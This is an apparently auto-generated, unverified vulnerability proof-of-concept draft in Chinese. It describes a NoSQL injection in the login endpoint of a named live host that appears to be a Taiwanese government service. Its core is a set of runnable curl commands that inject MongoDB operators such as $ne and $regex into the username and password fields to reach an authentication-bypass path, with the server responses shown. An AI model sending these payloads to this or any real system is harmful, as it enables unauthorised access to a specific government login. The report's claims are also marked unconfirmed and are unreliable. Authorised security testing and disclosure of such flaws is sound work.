# POC/EXP — /login 接口存在 NoSQL 注入（可绕过认证进入 source 校验分支）

> 漏洞ID: `16af2a47-f55c-4933-8001-6981e33763fa`  | 嚴重度: **high** | 狀態: open | 目標: `POST /login (https://epcr.tpf.gov.tw:4004/login) — username / password 参数`

**類型**: NoSQL 注入

## 描述

/login 的 username 与 password 字段直接拼入 MongoDB find() 查询，未过滤 NoSQL 操作符。username 注入 $ne 时返回 403「無法登入的來源」（证明查询命中多用户并进入 source 校验分支）；注入 $regex/$exists/$type/$in 时返回 500 "TypeError"（单匹配路径崩溃）。password 同样可注入操作符。

## POC / 復現步驟

```
curl -k -X POST https://epcr.tpf.gov.tw:4004/login -H 'Content-Type: application/json' -d '{"username":{"$ne":null},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"}'
→ HTTP 403 {"name":"ErrorWithStatusCode","message":"無法登入的來源","code":403}

curl -k -X POST https://epcr.tpf.gov.tw:4004/login -H 'Content-Type: application/json' -d '{"username":{"$regex":"^"},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"}'
→ HTTP 500 "TypeError" (11 bytes)

对照组（普通字符串 username）→ 正常登录流程响应。
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
